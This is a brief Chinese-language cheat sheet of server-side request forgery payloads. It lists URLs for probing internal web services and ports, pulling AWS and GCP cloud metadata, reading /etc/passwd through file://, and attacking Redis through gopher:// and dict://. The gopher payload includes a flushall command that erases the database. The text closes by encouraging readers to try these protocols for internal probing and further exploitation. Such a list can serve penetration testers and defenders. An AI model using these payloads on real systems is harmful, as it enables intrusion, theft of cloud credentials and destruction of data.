# 服务端请求伪造 (SSRF)

## 概述
适用于图片远程加载、URL 采集、API 代理等场景。

## 常用 Payload

### 内网探测
- `http://127.0.0.1:80` – 探测内网 Web 服务
- `http://localhost:22` – 端口扫描
- `http://127.0.0.1:8080/admin` – 访问内网管理后台

### 云平台元数据
- `http://169.254.169.254/latest/meta-data/` – AWS 元数据
- `http://metadata.google.internal/` – GCP 元数据

### 本地文件读取
- `file:///etc/passwd` – 本地文件读取

### 攻击内部服务（以 Redis 为例）
- `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...` – 攻击 Redis
- `dict://127.0.0.1:6379/info` – 探测 Redis

## 说明
当目标允许外部资源加载时，可尝试各类协议实现内网探测或进一步利用。